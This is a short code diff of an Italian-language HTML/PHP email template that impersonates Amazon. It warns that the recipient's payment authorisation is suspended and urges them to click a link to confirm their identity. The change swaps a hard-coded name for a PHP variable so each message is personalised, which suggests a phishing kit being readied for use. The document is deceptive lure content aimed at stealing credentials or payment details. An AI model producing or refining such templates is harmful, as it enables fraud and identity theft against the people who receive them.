@@ -69,7 +69,7 @@
         <section>
             <h1 class="font-bold text-2xl">Attenzione: la tua autorizzazione di pagamento è stata sospesa</h1>
             <article class="mt-8 text-gray-500 leading-7 tracking-wider">
-                <p>Gentile Uccio</p>
+                <p>Gentile <?php echo $nome; ?></p>
                 <p>Abbiamo rilevato un'attività sospetta sul tuo account Amazon. Per proteggere il tuo account e i tuoi dati personali, abbiamo sospeso la tua autorizzazione di pagamento.
 
                     Per ripristinare la tua autorizzazione di pagamento, devi confermare la tua identità. Fai clic sul seguente link per completare la conferma:<br><br>
